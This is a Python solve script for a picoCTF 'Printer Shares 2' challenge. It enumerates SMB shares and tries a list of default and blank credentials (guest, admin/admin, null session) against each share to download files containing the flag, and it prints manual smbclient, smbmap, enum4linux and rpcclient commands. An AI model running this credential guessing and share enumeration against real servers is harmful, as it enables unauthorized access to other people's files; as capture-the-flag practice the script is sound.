#!/usr/bin/env python3
"""
Printer Shares 2 - picoCTF 2026 (General Skills, 200 pts)

A "Secure Printer" SMB share that blocks simple anonymous access.
This script tries multiple authentication methods and share names
to enumerate and retrieve the flag.

Usage:
    python3 solve.py

Dependencies: smbprotocol (pip install smbprotocol)
    OR use smbclient (system package) via subprocess

You will need to fill in the challenge-specific values below:
  - HOST: The challenge hostname
  - PORT: The challenge SMB port
"""

import subprocess
import sys
import re
import os
import tempfile

# ============================================================
# CHALLENGE-SPECIFIC VALUES - Fill these in from the challenge
# ============================================================
HOST = "CHALLENGE_HOST"  # e.g., "mysterious-sea.picoctf.net"
PORT = "CHALLENGE_PORT"  # e.g., "53888"

# Common share names to try
SHARE_NAMES = [
    "shares",
    "print$",
    "printer",
    "spool",
    "public",
    "documents",
    "IPC$",
    "flag",
    "secure",
    "print",
    "Printer",
    "PrinterShare",
]

# Credential pairs to try: (username, password)
CREDENTIALS = [
    ("", ""),                    # Null session
    ("guest", ""),               # Guest with blank password
    ("guest", "guest"),          # Guest/guest
    ("print", ""),               # Print user blank password
    ("print", "print"),          # Print/print
    ("printer", ""),             # Printer blank password
    ("printer", "printer"),      # Printer/printer
    ("admin", ""),               # Admin blank password
    ("admin", "admin"),          # Admin/admin
    ("anonymous", ""),           # Anonymous
    ("anonymous", "anonymous"),  # Anonymous/anonymous
    ("smbuser", ""),             # SMB user blank
    ("user", ""),                # User blank
    ("user", "user"),            # User/user
]


def run_smbclient(args, timeout=15):
    """Run smbclient with given arguments and return (returncode, stdout, stderr)."""
    cmd = ["smbclient"] + args
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except FileNotFoundError:
        print("[!] smbclient not found. Install it with: sudo apt install smbclient")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        return -1, "", "Timeout"


def enumerate_shares(host, port):
    """Try to list available shares on the server."""
    print("[*] Enumerating SMB shares...")
    found_shares = []

    for username, password in CREDENTIALS:
        cred_desc = f"user='{username}', pass='{password}'" if username else "anonymous"
        args = ["-L", f"//{host}", "-p", port]

        if not username and not password:
            args.append("-N")
        elif username:
            args.extend(["-U", f"{username}%{password}"])
        else:
            args.append("-N")

        # Try with different SMB protocol options
        for extra_opts in [[], ["--option=client min protocol=NT1"]]:
            rc, stdout, stderr = run_smbclient(args + extra_opts)

            if rc == 0 and ("Disk" in stdout or "Printer" in stdout or "IPC" in stdout):
                print(f"[+] Share listing succeeded with {cred_desc}")
                print(f"    Output:\n{stdout}")

                # Parse share names from output
                for line in stdout.splitlines():
                    line = line.strip()
                    if "Disk" in line or "Printer" in line:
                        share_name = line.split()[0]
                        if share_name not in found_shares:
                            found_shares.append(share_name)
                            print(f"    [+] Found share: {share_name}")
                break

        if found_shares:
            break

    return found_shares


def try_access_share(host, port, share_name, username, password):
    """
    Try to connect to a share and list/download files.
    Returns the flag if found, None otherwise.
    """
    args = [f"//{host}/{share_name}", "-p", port]

    if not username and not password:
        args.append("-N")
    elif username:
        args.extend(["-U", f"{username}%{password}"])
    else:
        args.append("-N")

    # Command to list files and search for flag
    smb_commands = "ls\ncd spool\nls\ncd ..\ncd print\nls\ncd ..\n"

    rc, stdout, stderr = run_smbclient(
        args + ["-c", "ls"],
    )

    if rc != 0 or "NT_STATUS_" in stderr:
        return None

    print(f"  [+] Connected to //{host}/{share_name}")
    print(f"      Files: {stdout.strip()}")

    # Look for interesting files
    flag_files = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith(".."):
            continue
        # Parse smbclient ls output: "  filename    N    size  date"
        parts = line.split()
        if parts:
            fname = parts[0]
            if fname in (".", ".."):
                continue
            # Prioritize flag files, then any text/data files
            if "flag" in fname.lower() or fname.endswith(".txt") or fname.endswith(".pcl") or fname.endswith(".prn") or fname.endswith(".ps"):
                flag_files.insert(0, fname)
            elif not fname.startswith("."):
                flag_files.append(fname)

    # Download and check each file
    with tempfile.TemporaryDirectory() as tmpdir:
        for fname in flag_files:
            local_path = os.path.join(tmpdir, fname)
            dl_args = args + ["-c", f'get "{fname}" "{local_path}"']
            rc, stdout_dl, stderr_dl = run_smbclient(dl_args)

            if rc == 0 and os.path.exists(local_path):
                try:
                    with open(local_path, 'r', errors='replace') as f:
                        content = f.read()

                    # Search for flag pattern
                    flag_match = re.search(r'picoCTF\{[^}]+\}', content)
                    if flag_match:
                        return flag_match.group(0)

                    # Also try binary search with strings
                    if not flag_match:
                        result = subprocess.run(
                            ["strings", local_path],
                            capture_output=True, text=True, timeout=10,
                        )
                        flag_match = re.search(r'picoCTF\{[^}]+\}', result.stdout)
                        if flag_match:
                            return flag_match.group(0)

                    # Print file content (truncated) for debugging
                    preview = content[:500]
                    if preview.strip():
                        print(f"      Content of {fname}: {preview[:200]}...")

                except Exception as e:
                    print(f"      Error reading {fname}: {e}")

    # Also try listing subdirectories
    for subdir in ["spool", "print", "jobs", "data"]:
        rc, stdout_sub, stderr_sub = run_smbclient(
            args + ["-c", f"cd {subdir}; ls"],
        )
        if rc == 0 and "NT_STATUS_" not in stderr_sub and stdout_sub.strip():
            print(f"      Subdirectory {subdir}/: {stdout_sub.strip()}")
            # Look for files in subdirectory
            for line in stdout_sub.splitlines():
                parts = line.strip().split()
                if parts and parts[0] not in (".", ".."):
                    fname = parts[0]
                    with tempfile.TemporaryDirectory() as tmpdir2:
                        local_path = os.path.join(tmpdir2, fname)
                        dl_args = args + ["-c", f'cd {subdir}; get "{fname}" "{local_path}"']
                        rc2, _, _ = run_smbclient(dl_args)
                        if rc2 == 0 and os.path.exists(local_path):
                            try:
                                with open(local_path, 'r', errors='replace') as f:
                                    content = f.read()
                                flag_match = re.search(r'picoCTF\{[^}]+\}', content)
                                if flag_match:
                                    return flag_match.group(0)
                            except Exception:
                                pass

    return None


def main():
    print("=" * 60)
    print("  Printer Shares 2 - picoCTF 2026 (General Skills, 200 pts)")
    print("  Secure Printer SMB share exploitation")
    print("=" * 60)

    if HOST == "CHALLENGE_HOST":
        print()
        print("[!] Please update HOST and PORT with the challenge values.")
        print()
        print("[*] Example:")
        print('    HOST = "mysterious-sea.picoctf.net"')
        print('    PORT = "53888"')
        print()
        print("[*] Manual quick-try commands:")
        print("    smbclient -L //HOST -p PORT -N")
        print("    smbclient -L //HOST -p PORT -U 'guest' --password=''")
        print("    smbclient //HOST/shares -p PORT -N")
        print("    smbclient //HOST/shares -p PORT -U 'guest' --password=''")
        print("    smbmap -H HOST -P PORT")
        print("    smbmap -H HOST -P PORT -u 'guest' -p ''")
        sys.exit(1)

    # Step 1: Enumerate shares
    found_shares = enumerate_shares(HOST, PORT)

    # Combine found shares with our default list
    all_shares = list(found_shares)
    for s in SHARE_NAMES:
        if s not in all_shares:
            all_shares.append(s)

    # Step 2: Try to access each share with each credential pair
    print(f"\n[*] Trying {len(all_shares)} shares with {len(CREDENTIALS)} credential pairs...")

    flag = None
    for share_name in all_shares:
        for username, password in CREDENTIALS:
            cred_desc = f"'{username}':'{password}'" if username else "anonymous"
            print(f"  [*] Trying //{HOST}/{share_name} as {cred_desc}...")

            flag = try_access_share(HOST, PORT, share_name, username, password)
            if flag:
                break
        if flag:
            break

    # Print result
    if flag:
        print(f"\n{'=' * 60}")
        print(f"  FLAG: {flag}")
        print(f"{'=' * 60}")
    else:
        print("\n[!] Could not retrieve flag automatically.")
        print("[*] Manual investigation steps:")
        print(f"    1. smbclient -L //{HOST} -p {PORT} -N")
        print(f"    2. smbmap -H {HOST} -P {PORT}")
        print(f"    3. enum4linux -a {HOST} -p {PORT}")
        print(f"    4. Try: smbclient //{HOST}/<share> -p {PORT} -U 'guest' --password=''")
        print(f"    5. Check print job files for embedded flags (PCL/PostScript/PJL)")
        print(f"    6. Try rpcclient -U '' -N {HOST} -p {PORT}")


if __name__ == '__main__':
    main()
